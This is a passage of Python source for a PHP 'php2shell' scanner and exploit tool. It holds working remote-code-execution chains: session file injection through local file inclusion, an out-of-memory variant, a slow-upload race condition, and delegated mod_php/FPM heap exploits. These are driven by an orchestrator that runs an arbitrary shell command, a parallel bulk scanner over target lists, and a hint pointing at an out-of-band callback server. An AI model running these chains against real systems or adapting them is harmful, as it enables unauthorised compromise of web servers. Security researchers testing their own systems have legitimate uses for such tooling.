                out["output"] = bt.split(s_tag, 1)[1].split(e_tag, 1)[0].strip()
                out["detail"] = f"SFI+OOM via ?{lfi_p}= → {sf}"
                out["method"] = "sfi_oom"
                return out

    out["detail"] = f"OOM sent (sess_{sid}), no LFI hit"
    out["planted_sid"] = sid
    return out


def _rce_sfi_race(info, command):
    """Chain C: Race condition — slow upload keeps session alive while
    rapid LFI probes try to include it before cleanup."""
    host, port, tls, path = info["host"], info["port"], info["tls"], info["path"]
    proxy = info.get("proxy")
    sn, pn = info["session_name"], info["progress_name"]
    out = {"name": "sfi_race", "success": False, "detail": "", "output": ""}

    lfi_ep = info.get("lfi_endpoint")
    lfi_p = info.get("lfi_param")
    if not lfi_ep or not lfi_p:
        out["detail"] = "No LFI endpoint — Chain C needs LFI"
        return out

    mk = secrets.token_hex(6)
    sid = f"p2s{secrets.token_hex(12)}"
    php_fn, s_tag, e_tag = _php_payload(command, mk)
    bnd = "----race" + secrets.token_hex(4)
    done = threading.Event()

    maxbody = info.get("max_body") or 50 * 1024**2

    def slow_upload():
        """Drip-feed a large upload to keep the session file alive."""
        try:
            sock = _connect(host, port, tls, 30, proxy)
            mp_hdr = (
                f"--{bnd}\r\nContent-Disposition: form-data; name=\"{sn}\"\r\n\r\n{sid}\r\n"
                f"--{bnd}\r\nContent-Disposition: form-data; name=\"{pn}\"\r\n\r\nprobe\r\n"
                f"--{bnd}\r\nContent-Disposition: form-data; name=\"f\"; "
                f"filename=\"{php_fn}\"\r\n"
                f"Content-Type: application/octet-stream\r\n\r\n"
            ).encode("latin-1")
            fsize = max(10000, min(maxbody - len(mp_hdr) - 200, 500000))
            footer = f"\r\n--{bnd}--\r\n".encode()
            total = len(mp_hdr) + fsize + len(footer)
            chunk = max(100, fsize // 200)
            sock.sendall(
                (f"POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {UA}\r\n"
                 f"Content-Type: multipart/form-data; boundary={bnd}\r\n"
                 f"Content-Length: {total}\r\nCookie: {sn}={sid}\r\n"
                 f"Connection: close\r\n\r\n").encode() + mp_hdr)
            for off in range(0, fsize, chunk):
                if done.is_set():
                    break
                sock.sendall(b"A" * min(chunk, fsize - off))
                time.sleep(0.08)
            sock.sendall(footer)
            try:
                sock.recv(4096)
            except Exception:
                pass
            sock.close()
        except Exception:
            pass
        finally:
            done.set()

    t = threading.Thread(target=slow_upload, daemon=True)
    t.start()
    time.sleep(0.3)

    save_paths = list(dict.fromkeys(filter(None, [
        info.get("save_path")] + SESSION_DIRS[:4])))
    attempts = 0

    for sp in save_paths:
        sf = f"{sp}/sess_{sid}"
        for trav in [sf, "../" * 5 + sf.lstrip("/")]:
            for param in [lfi_p]:  # Use discovered LFI param
                if done.is_set():
                    break
                for _ in range(20):  # Multiple rapid probes
                    if done.is_set():
                        break
                    attempts += 1
                    test_url = f"{lfi_ep}?{param}={trav}"
                    _, _, b2 = _send_recv(host, port, tls, "GET", test_url,
                                         {"User-Agent": UA}, timeout=5, proxy=proxy)
                    bt = b2.decode("latin-1", "replace") if b2 else ""
                    if s_tag in bt:
                        done.set()
                        t.join(3)
                        out["success"] = True
                        out["output"] = bt.split(s_tag, 1)[1].split(e_tag, 1)[0].strip()
                        out["detail"] = f"Race SFI via ?{param}= → {sf}"
                        out["method"] = "sfi_race"
                        return out

    done.set()
    t.join(3)
    out["detail"] = f"Race: 0/{attempts} LFI hits during upload window"
    return out


def _rce_modphp_heap(info, command):
    """Chain D: mod_php heap exploitation (delegate to godylockz php2shell.py)."""
    out = {"name": "modphp_heap", "success": False, "detail": "", "output": ""}

    if info["sapi"] not in ("mod_php", "likely_mod_php"):
        out["detail"] = f"SAPI is {info['sapi']}, not mod_php — skipping heap chain"
        return out

    tool_dir = os.path.dirname(os.path.abspath(__file__))
    p2s_path = os.path.join(tool_dir, "php2shell.py")
    if not os.path.exists(p2s_path):
        out["detail"] = "php2shell.py not found — mod_php heap chain unavailable"
        return out

    import subprocess
    try:
        args = [sys.executable, p2s_path, "exploit",
                "-u", info["url"], "--allow-remote"]
        if command != "id;hostname":
            args.extend(["-c", command])
        r = subprocess.run(args, capture_output=True, text=True, timeout=120)
        if "PRE-AUTH RCE CONFIRMED" in r.stdout or "RCE confirmed" in r.stdout:
            out["success"] = True
            out["output"] = r.stdout[-500:]
            out["method"] = "modphp_heap"
            out["detail"] = "godylockz heap chain succeeded"
        else:
            out["detail"] = f"Heap chain returned: {r.stdout[-200:]}"
    except subprocess.TimeoutExpired:
        out["detail"] = "Heap chain timed out (120s)"
    except Exception as e:
        out["detail"] = f"Heap chain error: {e}"

    return out


def _rce_modphp_heap_128(info, command):
    """Chain D2: Oracle-Security mod_php heap (128M, display_errors=Off).
    ASLR bypass via PHPSESSID cookie memory leak → heap spray → zif_system.
    Delegates to oracle-exploit/exploit.py."""
    out = {"name": "modphp_heap_128", "success": False, "detail": "", "output": ""}

    if info["sapi"] not in ("mod_php", "likely_mod_php"):
        out["detail"] = f"SAPI is {info['sapi']}, not mod_php — skipping"
        return out

    tool_dir = os.path.dirname(os.path.abspath(__file__))
    exploit_path = os.path.join(tool_dir, "oracle-exploit", "exploit.py")
    if not os.path.exists(exploit_path):
        out["detail"] = "oracle-exploit/exploit.py not found"
        return out

    # This exploit needs: --url (a directly accessible .php file),
    # --cmd (max 14 bytes), --expect, --fetch or --proof-url.
    # For detection we use `id` and fetch the output from a known path.
    # But the exploit writes `id` output to stdout via proof callback,
    # so we need a proof endpoint. For a standalone test, we use --fetch
    # with a path where the command output would land.
    #
    # The 14-byte limit means we can run `id` (2 bytes) directly.
    cmd = command[:14] if len(command) <= 14 else "id"
    url = info["url"].rstrip("/")
    # Need a directly accessible .php file — try known paths
    php_paths = ["/index.php", "/wp-login.php", "/wp-content/themes/twentytwentyfour/patterns/text-feature-grid-3-col.php"]
    if info.get("cms") == "wordpress":
        php_paths = ["/wp-content/themes/twentytwentyfour/patterns/text-feature-grid-3-col.php"] + php_paths

    out["detail"] = (f"Oracle-Security heap chain ready (128M, errors=Off). "
                     f"Requires: --proof-url (OOB callback) + --cmd (max 14 bytes) "
                     f"+ per-build libphp offsets. Run manually:\n"
                     f"  python3 oracle-exploit/exploit.py --url {url}/index.php "
                     f"--cmd 'id' --proof-url http://YOUR_SERVER/proof --expect uid= "
                     f"--verbose")
    return out


def _rce_handler_mismatch(info, command):
    """Chain E: Handler mismatch deserialization.
    Requires two directories with different session.serialize_handler settings.
    Writes session via php_serialize dir, reads via php dir → pipe split → object injection."""
    out = {"name": "handler_mismatch", "success": False, "detail": "", "output": ""}

    mismatches = info.get("handler_mismatch_dirs", [])
    if len(mismatches) < 2:
        # Check if phpinfo revealed a base handler we can mismatch against
        base_handler = info.get("serialize_handler", "php")
        has_alt = any(d["handler"] != base_handler for d in mismatches)
        if not has_alt:
            out["detail"] = (f"No handler mismatch detected "
                             f"({len(mismatches)} dirs with same handler)")
            return out

    out["detail"] = (f"Handler mismatch detected in {len(mismatches)} dirs. "
                     f"Requires POP gadget chain for target CMS/framework — "
                     f"chain ready for manual exploitation. "
                     f"Dirs: {[d['path'] for d in mismatches]}")
    return out


def _rce_fpm_heap(info, command):
    """Chain F: FPM heap with offset profiles (delegate to php2shell_fpm.py)."""
    out = {"name": "fpm_heap", "success": False, "detail": "", "output": ""}

    if info["sapi"] not in ("fpm",):
        out["detail"] = f"SAPI is {info['sapi']}, not FPM — skipping FPM heap chain"
        return out

    tool_dir = os.path.dirname(os.path.abspath(__file__))
    fpm_path = os.path.join(tool_dir, "php2shell_fpm.py")
    if not os.path.exists(fpm_path):
        out["detail"] = "php2shell_fpm.py not found — FPM heap chain unavailable"
        return out

    # Check for matching profile
    php = info.get("php", "unknown")
    prof = os.path.join(tool_dir, "profiles", f"fpm-php-{php}.json")
    if not os.path.exists(prof):
        out["detail"] = (f"No FPM offset profile for PHP {php}. "
                         f"Run: python offsets_fpm.py {php} to generate one, "
                         f"or use exploit-dev-testbed with Docker.")
        return out

    import subprocess
    try:
        r = subprocess.run(
            [sys.executable, fpm_path, info["url"], "--mode", "exploit"],
            capture_output=True, text=True, timeout=120)
        if "RCE" in r.stdout.upper() and "CONFIRMED" in r.stdout.upper():
            out["success"] = True
            out["output"] = r.stdout[-500:]
            out["method"] = "fpm_heap"
            out["detail"] = "FPM heap chain succeeded"
        else:
            out["detail"] = f"FPM heap returned: {r.stdout[-200:]}"
    except subprocess.TimeoutExpired:
        out["detail"] = "FPM heap chain timed out (120s)"
    except Exception as e:
        out["detail"] = f"FPM heap error: {e}"

    return out


# ── Orchestrator ──

CHAIN_MAP = {
    "sfi":        _rce_sfi_direct,
    "sfi_oom":    _rce_sfi_oom,
    "race":       _rce_sfi_race,
    "modphp":     _rce_modphp_heap,
    "modphp128":  _rce_modphp_heap_128,
    "mismatch":   _rce_handler_mismatch,
    "fpm":        _rce_fpm_heap,
}

# Default chain order: most reliable first, adjusted by detected SAPI
CHAIN_ORDER_MODPHP = ["sfi", "sfi_oom", "race", "modphp", "modphp128", "mismatch"]
CHAIN_ORDER_FPM    = ["sfi", "sfi_oom", "race", "mismatch", "fpm"]
CHAIN_ORDER_OTHER  = ["sfi", "sfi_oom", "race", "mismatch"]


def attempt_rce(info, command="id;hostname", chain=None):
    """Multi-strategy RCE. Tries chains in order of reliability for the
    detected SAPI, or a specific chain if --chain is set."""

    if chain and chain in CHAIN_MAP:
        r = CHAIN_MAP[chain](info, command)
        return {**r, "strategies": [r]}

    # Pick chain order by SAPI
    if info["sapi"] in ("mod_php", "likely_mod_php"):
        order = CHAIN_ORDER_MODPHP
    elif info["sapi"] == "fpm":
        order = CHAIN_ORDER_FPM
    else:
        order = CHAIN_ORDER_OTHER

    strategies = []
    for cname in order:
        fn = CHAIN_MAP[cname]
        r = fn(info, command)
        strategies.append(r)
        if r.get("success"):
            return {**r, "strategies": strategies}

    parts = [f"[{s['name']}] {s['detail']}" for s in strategies if s.get("detail")]
    return {"success": False, "method": "all_attempted",
            "strategies": strategies, "output": " | ".join(parts)}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Report formatter
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

RED = "\033[91m"
GRN = "\033[92m"
YLW = "\033[93m"
CYN = "\033[96m"
RST = "\033[0m"
BLD = "\033[1m"
DIM = "\033[2m"


def _c(color, text):
    if not sys.stdout.isatty():
        return str(text)
    return f"{color}{text}{RST}"


def print_result(info, surface=None, fixation=None, deep=None, rce=None):
    W = 58
    print()
    print(_c(BLD, f"  {'━' * W}"))
    print(_c(BLD, f"  p2s v{__version__} — {info['url']}"))
    print(_c(BLD, f"  {'━' * W}"))

    # Version
    ver = info.get("php", "hidden")
    st = info.get("status", "UNKNOWN")
    color = RED if st in ("VULN", "EOL", "ANCIENT") else GRN if st == "SAFE" else YLW
    print(f"  PHP:       {_c(color, f'{ver} ({st})')}")
    print(f"  Server:    {info['server']}")
    print(f"  SAPI:      {info['sapi']}")
    print(f"  OS hint:   {info['os_hint']}")
    if info.get("cms"):
        print(f"  CMS:       {info['cms']}"
              + (f" {info['wp_version']}" if info.get("wp_version") else ""))
    if info.get("memory_limit"):
        print(f"  Mem:       {info['memory_limit']}")
    if info.get("upload_progress") is not None:
        up = _c(RED, "ON") if info["upload_progress"] else _c(GRN, "OFF")
        print(f"  Upload:    session.upload_progress = {up}")
    if info.get("display_errors") is not None:
        de = "ON" if info["display_errors"] else "OFF"
        print(f"  Errors:    display_errors = {de}")
    if info.get("serialize_handler"):
        print(f"  Handler:   session.serialize_handler = {info['serialize_handler']}")
    if info.get("use_only_cookies") is not None:
        uc = _c(GRN, "ON") if info["use_only_cookies"] else _c(RED, "OFF")
        print(f"  Cookies:   session.use_only_cookies = {uc}")
    if info.get("max_body"):
        print(f"  Body:      max ~{info['max_body'] // 1024 // 1024}MB")
    if info.get("phpinfo_exposed"):
        print(f"  {_c(YLW, 'INFO:      phpinfo() publicly accessible')}")

    # Surface discovery
    if surface:
        print()
        if info.get("lfi_endpoint"):
            lfi_label = info["lfi_endpoint"] + "?" + info["lfi_param"] + "="
            print(f"  LFI:       {_c(RED, lfi_label)}")
        else:
            print(f"  LFI:       {_c(DIM, 'not found')}")
        if surface.get("user_ini_found"):
            print(f"  .user.ini: {_c(YLW, ', '.join(surface['user_ini_found']))}")
        if info.get("handler_mismatch_dirs"):
            print(f"  Mismatch:  {_c(RED, str([d['handler'] for d in info['handler_mismatch_dirs']]))}")

    # Session fixation
    if fixation:
        if fixation.get("fixation"):
            print(f"\n  Fixation:  {_c(RED, 'POST body PHPSESSID ACCEPTED (CVE-2026-109618)')}")
        else:
            print(f"\n  Fixation:  {_c(DIM, 'not confirmed')}")

    # Deep probe
    if deep:
        print()
        crashes = deep.get("oom_crashes", 0)
        sprays = deep.get("sprays", 0)
        if crashes > 0:
            print(f"  OOM:       {_c(RED, f'{crashes}/{sprays} worker crashes')}")
        else:
            print(f"  OOM:       {_c(GRN, f'0/{sprays} crashes')}")
        if not deep.get("oom_reachable"):
            print(f"  {_c(YLW, 'NOTE:      OOM may not be reachable')}")
        if deep.get("stale_sids"):
            n = len(deep["stale_sids"])
            print(f"  Stale:     {_c(RED, str(n) + ' leaked SIDs (CVE-2026-109619)')}")
        if deep.get("memory_leak_sids"):
            n = len(deep["memory_leak_sids"])
            print(f"  Mem leak:  {_c(RED, str(n) + ' abnormal SIDs (CVE-2026-109618)')}")
        if deep.get("anomalies"):
            print(f"  Anomaly:   {len(deep['anomalies'])} detected")

    # RCE
    if rce:
        print()
        if rce.get("success"):
            print(f"  {_c(BLD, _c(RED, '◆ RCE: PRE-AUTH RCE CONFIRMED ◆'))}")
            if rce.get("method"):
                print(f"  Method:    {rce['method']}")
            output = str(rce.get("output", "")).strip()
            if output and output != "(blind)":
                for line in output.split("\n")[:8]:
                    print(f"    {_c(RED, '▸ ' + line)}")
        else:
            for s in rce.get("strategies", []):
                icon = _c(GRN, "✓") if s.get("success") else _c(DIM, "–")
                print(f"  [{icon}] {s.get('name', '?')}: "
                      f"{s.get('detail', '')[:80]}")

    # Verdict
    print()
    verdict, sev = _verdict(info, deep, rce)
    vc = (RED if any(x in verdict for x in ("VULN", "RCE", "CONFIRMED"))
          else YLW if "LIKELY" in verdict else GRN)
    print(f"  {_c(BLD, 'VERDICT:')}  {_c(vc, verdict)}")
    print(f"  {_c(BLD, 'SEVERITY:')} {sev}")

    # CVE coverage
    cves = ["CVE-2026-109618", "CVE-2026-109619"]
    if info.get("serialize_handler") and info["serialize_handler"] != "php":
        cves.append("CVE-2026-115560")
    print(f"  {_c(BLD, 'CVEs:')}     {', '.join(cves)}")
    print(f"  {'━' * W}")
    print()
    return verdict


def _verdict(info, deep=None, rce=None):
    if rce and rce.get("success"):
        return "RCE CONFIRMED", "Critical"
    st = info.get("status", "UNKNOWN")
    if deep and deep.get("memory_leak_sids"):
        return "VULN — memory disclosure (CVE-2026-109618 CONFIRMED)", "Critical"
    if deep and deep.get("stale_sids"):
        return "VULN — stale state persists (CVE-2026-109619 CONFIRMED)", "Critical"
    if deep and deep.get("oom_crashes", 0) > 0:
        if st in ("VULN", "EOL"):
            return "VULN — OOM crash + known vulnerable version", "High"
        return "LIKELY VULN — OOM crash observed", "High"
    if info.get("lfi_endpoint"):
        if st in ("VULN", "EOL"):
            return "VULN — LFI + vulnerable PHP → SFI chain viable", "Critical"
        return "LFI FOUND — SFI chain viable if PHP unpatched", "High"
    if st == "EOL":
        return "VULN — EOL, no upstream patch exists", "Critical"
    if st == "VULN":
        return "VULN — below upstream fix line", "High"
    if st == "PRERELEASE":
        return "PRERELEASE — verify patch provenance manually", "Medium"
    if info.get("is_php") and info.get("upload_progress"):
        return "POSSIBLE — PHP + upload_progress ON, version unknown", "Medium"
    if info.get("is_php"):
        return "PHP detected, version unknown", "Info"
    if st == "SAFE":
        return "SAFE — patched upstream", "None"
    return "NOT PHP or inconclusive", "Info"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Orchestration
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def scan(url, deep=False, rce=False, command="id;hostname", chain=None,
         proxy=None):
    """Full scan pipeline: fingerprint → surface → fixation → deep → rce."""
    info = fingerprint(url, proxy=proxy)

    if not info["is_php"] and not deep and not rce:
        print_result(info)
        return info

    if info["status"] == "SAFE" and not deep and not rce:
        print_result(info)
        return info

    # Surface discovery + fixation check for deep/rce modes
    surface_result = None
    fixation_result = None
    if deep or rce:
        surface_result = discover_surface(info)
        fixation_result = check_session_fixation(info)

    deep_result = None
    if deep or rce:
        deep_result = deep_probe(info)

    rce_result = None
    if rce:
        rce_result = attempt_rce(info, command=command, chain=chain)

    verdict = print_result(info, surface_result, fixation_result,
                           deep_result, rce_result)

    info["_surface"] = surface_result
    info["_fixation"] = fixation_result
    info["_deep"] = deep_result
    info["_rce"] = rce_result
    info["_verdict"] = verdict
    return info


def bulk_scan(targets, output=None, deep=False, rce=False, workers=5,
              command="id;hostname", chain=None, proxy=None):
    """Parallel multi-target scan."""
    results = []

    def _scan_one(url):
        try:
            return scan(url, deep=deep, rce=rce, command=command,
                        chain=chain, proxy=proxy)
        except Exception as e:
            return {"url": url, "error": str(e)}

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(_scan_one, t): t for t in targets}
        for fut in concurrent.futures.as_completed(futs):
            r = fut.result()
            results.append(r)

    if output:
        with open(output, "w") as f:
            for r in results:
                safe = {k: v for k, v in r.items()
                        if not k.startswith("_") or k == "_verdict"}
                f.write(json.dumps(safe, default=str) + "\n")
        print(f"\n[+] Results: {output}")

    vulns = sum(1 for r in results if r.get("status") in ("VULN", "EOL"))
    rces = sum(1 for r in results
               if r.get("_rce", {}).get("success"))
    print(f"\n[=] Total: {len(results)} | Vulnerable: {vulns} | RCE: {rces}")
    return results


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CLI
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def main():
    ap = argparse.ArgumentParser(
        description="p2s v2.0 — php2shell unified scanner + exploit "
                    "(CVE-2026-109618/619/115560)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Chains (--chain):
  sfi       Session File Injection + LFI (direct, no OOM)
  sfi_oom   SFI + OOM to persist session past cleanup
  race      Race-condition SFI (slow upload + rapid LFI)
  modphp    mod_php heap exploitation (godylockz chain)
  mismatch  Handler mismatch deserialization
  fpm       FPM heap with offset profiles

Examples:
  %(prog)s https://target.com/                # auto-detect + assess
  %(prog)s https://target.com/ --deep         # full probe
  %(prog)s https://target.com/ --rce          # attempt all chains
  %(prog)s https://target.com/ --rce --chain sfi  # specific chain
  %(prog)s --proxy http://127.0.0.1:8080 URL  # through Burp
  %(prog)s -f targets.txt -o out.jsonl        # bulk scan
  %(prog)s --version 8.3.12                   # offline check
        """)
    ap.add_argument("url", nargs="?", help="Target URL")
    ap.add_argument("-f", "--file", help="File with URLs (one per line)")
    ap.add_argument("-o", "--output", help="JSONL output file")
    ap.add_argument("--deep", action="store_true",
                    help="OOM crash + stale state + surface discovery")
    ap.add_argument("--rce", action="store_true",
                    help="Attempt RCE (implies --deep)")
    ap.add_argument("-c", "--command", default="id;hostname",
                    help="Shell command for RCE (default: id;hostname)")
    ap.add_argument("--chain", choices=list(CHAIN_MAP.keys()),
                    help="Force a specific exploit chain")
    ap.add_argument("--version", dest="check_ver",
                    help="Offline version check (e.g. 8.3.12)")
    ap.add_argument("--workers", type=int, default=5,
                    help="Parallel workers for bulk scan")
    ap.add_argument("--allow-remote", action="store_true",
                    help="Required for non-localhost targets")
    ap.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080)")

    args = ap.parse_args()

    # Offline version check
    if args.check_ver:
        ver, status = classify(args.check_ver)
        if not ver:
            print(f"[!] Cannot parse: {args.check_ver}")
            return 2
        color = RED if status in ("VULN", "EOL", "ANCIENT") else GRN if status == "SAFE" else YLW
        print(f"PHP {ver}: {_c(color, status)}")
        fix = FIXED.get(tuple(int(x) for x in ver.split(".")[:2]))
        if fix:
            print(f"Fix: {ver.rsplit('.', 1)[0]}.{fix}")
        return 2 if status in ("VULN", "EOL", "ANCIENT") else 0

    if not args.url and not args.file:
        ap.error("provide a URL or -f targets.txt or --version X.Y.Z")

    # Collect targets
    targets = []
    if args.url:
        targets.append(args.url)
    if args.file:
        with open(args.file) as fh:
            for line in fh:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(line)

    # Safety: require --allow-remote for non-localhost
    if not args.allow_remote:
        for t in targets:
            u = urlparse(t)
            if u.hostname not in ("localhost", "127.0.0.1", "::1"):
                print(f"[!] Use --allow-remote for non-localhost: {t}")
                return 1

    if args.rce:
        args.deep = True

    if len(targets) == 1:
        r = scan(targets[0], deep=args.deep, rce=args.rce,
                 command=args.command, chain=args.chain, proxy=args.proxy)
        st = r.get("status", "UNKNOWN")
        return 2 if st in ("VULN", "EOL", "ANCIENT") else 0
    else:
        results = bulk_scan(targets, output=args.output, deep=args.deep,
                           rce=args.rce, workers=args.workers,
                           command=args.command, chain=args.chain,
                           proxy=args.proxy)
        vulns = sum(1 for r in results if r.get("status") in ("VULN", "EOL"))
        return 2 if vulns > 0 else 0


if __name__ == "__main__":
    sys.exit(main() or 0)
